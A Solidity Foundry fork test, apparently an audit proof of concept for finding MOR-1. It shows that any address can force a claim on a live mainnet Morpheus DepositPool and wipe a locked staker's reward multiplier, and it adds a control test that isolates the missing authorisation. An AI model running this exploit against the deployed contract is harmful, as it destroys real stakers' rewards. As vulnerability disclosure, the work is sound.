// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {Test} from "forge-std/Test.sol";

interface IDepositPool {
    function stake(uint256 rewardPoolIndex_, uint256 amount_, uint128 claimLockEnd_, address referrer_) external;
    function setClaimReceiver(uint256 rewardPoolIndex_, address receiver_) external;
    function claimFor(uint256 rewardPoolIndex_, address staker_, address receiver_) external payable;
    function getCurrentUserMultiplier(uint256 rewardPoolIndex_, address user_) external view returns (uint256);
    function usersData(address user_, uint256 rewardPoolIndex_) external view returns (
        uint128 lastStake, uint256 deposited, uint256 rate, uint256 pendingRewards,
        uint128 claimLockStart, uint128 claimLockEnd, uint256 virtualDeposited, uint128 lastClaim, address referrer);
    function depositToken() external view returns (address);
}
interface IERC20 { function approve(address, uint256) external returns (bool); function balanceOf(address) external view returns (uint256); }

/// MOR-1 — a forced claim resets any locked staker's reward multiplier, on the DEPLOYED capital pool.
/// TARGET (Appendix A, Ethereum mainnet): USDC DepositPool 0x6cCE082851Add4c535352f596662521B4De4750E,
/// EIP-1967 impl 0xdB10dAEF167eA2233Ba6811457dD24D676FbD670. Fork pinned to FORK_BLOCK.
/// Attacker and victim are fresh EOAs. No owner/admin/privileged role is used anywhere.
contract MOR1_Fork is Test {
    IDepositPool constant POOL = IDepositPool(0x6cCE082851Add4c535352f596662521B4De4750E);
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant CONSUMER = 0xd182263d06FDC463c96190005D6359CC3d3Bbc5e; // ChainLinkDataConsumer (external oracle adapter)
    address constant DISTRIBUTOR = 0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A; // pulls the deposit token from the staker during stake
    uint256 constant FORK_BLOCK = 25949629;
    uint256 constant PRECISION = 1e25; // 1x multiplier floor

    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");
    address victimCold = makeAddr("victimColdWallet");

    function setUp() public {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"), FORK_BLOCK);
    }

    // Keep the external Chainlink adapter returning a fresh, positive price for every pathId — exactly the
    // state it is in during normal keeper operation. The staleness-revert path is a separate issue; here it
    // must not fire, because MOR-1 is about the multiplier reset, which is internal to the DepositPool and
    // independent of oracle values. Only the external adapter is mocked; no Morpheus contract, no admin.
    function _oracleFresh() internal {
        vm.mockCall(CONSUMER, abi.encodeWithSelector(bytes4(keccak256("getChainLinkDataFeedLatestAnswer(bytes32)"))), abi.encode(uint256(2000e18)));
    }

    function test_MOR1_anyoneResetsALockedStakersMultiplier() public {
        deal(USDC, victim, 10_000e6);
        uint128 lockEnd = uint128(block.timestamp + 3 * 365 days);
        vm.startPrank(victim);
        IERC20(USDC).approve(DISTRIBUTOR, 10_000e6);
        POOL.stake(0, 10_000e6, lockEnd, address(0));
        POOL.setClaimReceiver(0, victimCold); // victim routes rewards to a cold wallet — the only precondition
        vm.stopPrank();

        (, uint256 deposited,,,, uint128 lockEndBefore, uint256 vdBefore,,) = POOL.usersData(victim, 0);
        uint256 multLocked = POOL.getCurrentUserMultiplier(0, victim);
        assertGt(multLocked, PRECISION, "the 3-year lock earned a multiplier above 1x");
        assertGt(vdBefore, deposited, "virtual deposit is amplified by the lock");
        assertEq(lockEndBefore, lockEnd, "lock recorded");

        // the lock runs its full course; the multiplier does not decay with time
        vm.warp(uint256(lockEnd) + 1);
        assertEq(POOL.getCurrentUserMultiplier(0, victim), multLocked, "multiplier intact at lock expiry");

        // an unrelated address forces the claim. claimFor takes the no-auth branch because a claimReceiver is set.
        _oracleFresh();
        vm.deal(attacker, 1 ether);
        vm.prank(attacker);
        POOL.claimFor{value: 0.01 ether}(0, victim, attacker);

        (,,,,, uint128 lockEndAfter, uint256 vdAfter,,) = POOL.usersData(victim, 0);
        uint256 multAfter = POOL.getCurrentUserMultiplier(0, victim);
        assertEq(multAfter, PRECISION, "forced claim reset the multiplier to 1x");
        assertEq(lockEndAfter, 0, "forced claim zeroed the lock");
        assertEq(vdAfter, deposited, "virtual deposit collapsed to the raw principal");
        assertLt(vdAfter, vdBefore, "the amplified weight was destroyed");
        emit log_named_uint("multiplier before (1e25 = 1x)", multLocked);
        emit log_named_uint("multiplier after  (1e25 = 1x)", multAfter);
        emit log_named_uint("virtualDeposited before (USDC 6dp -> 18)", vdBefore);
        emit log_named_uint("virtualDeposited after  (USDC 6dp -> 18)", vdAfter);
        emit log_named_uint("emission weight destroyed, bps of prior weight", ((vdBefore - vdAfter) * 10_000) / vdBefore);
    }

    // Control: identical steps but the victim never set a claimReceiver → the attacker's forced claim is refused,
    // proving the reset above is reachable ONLY through the missing authorisation on the claimReceiver branch.
    function test_MOR1_control_withoutClaimReceiverForcedClaimIsRefused() public {
        deal(USDC, victim, 10_000e6);
        vm.startPrank(victim);
        IERC20(USDC).approve(DISTRIBUTOR, 10_000e6);
        POOL.stake(0, 10_000e6, uint128(block.timestamp + 3 * 365 days), address(0));
        vm.stopPrank();
        vm.warp(block.timestamp + 3 * 365 days + 1);
        _oracleFresh();
        vm.deal(attacker, 1 ether);
        vm.prank(attacker);
        vm.expectRevert(bytes("DS: invalid caller"));
        POOL.claimFor{value: 0.01 ether}(0, victim, attacker);
    }
}
